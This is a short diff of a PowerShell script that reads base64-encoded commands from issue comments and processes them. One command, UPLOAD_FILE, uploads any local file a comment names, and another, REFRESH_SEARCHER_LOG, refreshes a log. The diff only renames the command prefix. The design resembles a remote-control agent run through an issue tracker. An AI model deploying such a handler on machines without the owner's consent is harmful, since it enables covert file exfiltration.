@@ -189,11 +189,11 @@ try
             $bodyText = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($bodyText))
             
             #Process UPLOAD_FILE command.
-            If($bodyText -like "COMMAND{UPLOAD_FILE}:*")
+            If($bodyText -like "CMD{UPLOAD_FILE}:*")
             {
                 Write-Console -Body ("Processing UPLOAD_FILE command with comment ID " + $comment.ID + "...") -IssueNumber $issueNumber
                 Write-Host ("DEBUG: Processing UPLOAD_FILE command with comment ID " + $comment.ID + "...")
-                $targetFilePath = ($bodyText).replace("COMMAND{UPLOAD_FILE}:","")
+                $targetFilePath = ($bodyText).replace("CMD{UPLOAD_FILE}:","")
                 If([System.IO.File]::Exists($targetFilePath))
                 {
                     Write-Console -Body ("Found target file at " + $targetFilePath + ". Attempting to upload it...") -IssueNumber $issueNumber
@@ -216,7 +216,7 @@ try
                 }
             }
             #Process REFRESH_SEARCHER_LOG command.
-            ElseIf($bodyText -like "COMMAND{REFRESH_SEARCHER_LOG}")
+            ElseIf($bodyText -like "CMD{REFRESH_SEARCHER_LOG}")
             {
                 Write-Console -Body ("Processing REFRESH_SEARCHER_LOG command with comment ID " + $comment.ID + "...") -IssueNumber $issueNumber
                 Write-Host ("DEBUG: Processing REFRESH_SEARCHER_LOG command with comment ID " + $comment.ID + "...")
